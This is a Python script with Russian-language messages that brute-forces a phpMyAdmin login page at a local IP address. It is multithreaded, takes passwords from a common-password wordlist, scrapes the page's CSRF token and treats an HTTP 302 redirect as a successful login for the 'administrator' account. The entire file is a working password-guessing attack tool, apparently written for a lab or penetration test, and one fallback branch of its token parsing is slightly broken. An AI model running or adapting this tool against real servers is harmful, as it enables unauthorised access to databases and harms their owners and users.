import requests
from bs4 import BeautifulSoup
import sys
import re
import threading
import queue
import time

# Настройки цели
url = "http://192.168.31.97/phpmyadmin/"
wordlist_path = "/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt"
username = "administrator"

lines = 96507
current = 0
found = False

password_queue = queue.Queue(maxsize=500000)
lock = threading.Lock()

try:
    num_threads = int(input("[?] Количество потоков : "))
except ValueError:
    print("[-] Неверный ввод, количество потоков - 20 потоков.")
    num_threads = 20

def worker():
    global current, found
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept-Language": "en-US,en;q=0.9"
    })

    while not found:
        passwords_chunk = []
        for _ in range(5):
            try:
                passwords_chunk.append(password_queue.get_nowait())
            except queue.Empty:
                break
        
        if not passwords_chunk:
            time.sleep(0.1)
            continue

        try:
            response = session.get(url, timeout=5)
            if response.status_code != 200:
                for _ in passwords_chunk: password_queue.task_done()
                continue
            
            soup = BeautifulSoup(response.text, "html.parser")
            token_elements = soup.find_all("input", attrs={"name": "token"})
            
            if token_elements:
                token = token_elements[-1]["value"]
            else:
                tokens = re.findall(r'name=["\']token["\']\s+value=["\']([a-f0-9]{32})["\']|value=["\']([a-f0-9]{32})["\']\s+name=["\']token["\']', response.text)
                if tokens:
                    last_token_tuple = tokens[-1]
                    token = last_token_tuple if last_token_tuple else last_token_tuple
                else:
                    for _ in passwords_chunk: password_queue.task_done()
                    continue
            
        except Exception:
            for _ in passwords_chunk: password_queue.task_done()
            continue

        for password in passwords_chunk:
            if found:
                password_queue.task_done()
                continue

            data = {
                "pma_username": username,
                "pma_password": password,
                "server": "1",
                "target": "index.php",
                "lang": "en",
                "token": token
            }

            try:
                res = session.post(url, data=data, allow_redirects=False, timeout=5)
                
                if res.status_code == 302:
                    with lock:
                        if not found:
                            found = True
                            print(f"\n\n[+] УСПЕХ! Пароль найден: {password}")
                            import os
                            os._exit(0) 
                elif res.status_code in [501, 502, 503]:
                    with lock:
                        print("[!] Сервер не принимает запрос (5xx).")
                else:
                    with lock:
                        current += 1
                        print(f"[-] Пробуем: {password:<20} | {current} of {lines}", end="\r")
                    
            except Exception:
                pass
            
            password_queue.task_done()

print("[*] Запуск многопоточного перебора...")

threads = []
for i in range(num_threads):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    threads.append(t)
    time.sleep(0.05)

try:
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if found:
                break
            pwd = line.strip()
            if pwd:
                password_queue.put(pwd)

    password_queue.join()

except KeyboardInterrupt:
    print("\n[-] Перебор прерван.")
    sys.exit(0)

if not found:
    print("\n[-] Словарь закончился, пароль не найден.")
